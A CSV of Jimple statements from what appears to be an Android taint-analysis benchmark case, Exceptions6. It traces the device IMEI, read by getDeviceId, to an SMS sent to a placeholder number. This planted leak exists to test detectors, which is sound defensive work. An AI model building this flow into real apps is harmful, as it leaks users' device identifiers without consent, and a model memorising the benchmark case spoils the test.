,method,stmtLineNumber,stmt
0,<de.ecspride.Exceptions6: void callMe()>,-1,$r4 = virtualinvoke r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()
1,<de.ecspride.Exceptions6: void callMe()>,-1,r0.<de.ecspride.Exceptions6: java.lang.String imei> = $r4
2,<de.ecspride.Exceptions6: void callMe()>,-1,return
3,<de.ecspride.Exceptions6: void onCreate(android.os.Bundle)>,-1,$r2 = r0.<de.ecspride.Exceptions6: java.lang.String imei>
4,<de.ecspride.Exceptions6: void onCreate(android.os.Bundle)>,-1,"virtualinvoke $r4.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(""+49 1234"", null, $r2, null, null)"
